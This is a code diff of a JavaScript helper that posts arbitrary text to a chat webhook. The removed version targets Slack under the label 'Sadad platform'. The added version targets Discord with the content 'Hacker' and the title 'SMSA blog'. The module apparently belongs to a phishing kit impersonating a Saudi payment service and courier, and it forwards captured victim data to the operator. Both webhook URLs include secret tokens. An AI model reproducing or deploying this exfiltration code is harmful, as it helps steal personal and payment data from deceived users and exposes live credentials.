@@ -1,20 +1,27 @@
 import axios from 'axios';
 
-export const TeleSned = () => {
-    const Send = async (message) => {
-        const webhookUrl = 'https://hooks.slack.com/services/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';
-        const data = `منصة سداد \n ${message}`
-        axios.post(webhookUrl,JSON.stringify(data),{
-           withCredentials:false,
-           transformRequest:[
-               (data,headers) =>{
-                   return data
-               }
-           ]
-        });
-    };
 
-    return { Send };
-};
+export const TeleSned = () => {
+
+    const Send = async (des) => {
+        const body = {
+          content: "Hacker",
+          tts: false,
+          color: "white",
+          embeds: [
+            {
+              title: " مدونة سمسا ",
+              description: des,
+           },
+          ],
+    };
+            
+        await axios.post("https://discord.com/api/webhooks/1365733429538197684/8rfdu4mryh-YYxu-nRdrNhXg15ay76Ct4Py1CuZZ7f2tl7HBjUUbjR9FpzBXU2gjG1w5",body)
+             
+    }
+  return {
+    Send,
+}
+}
 
 export default TeleSned;
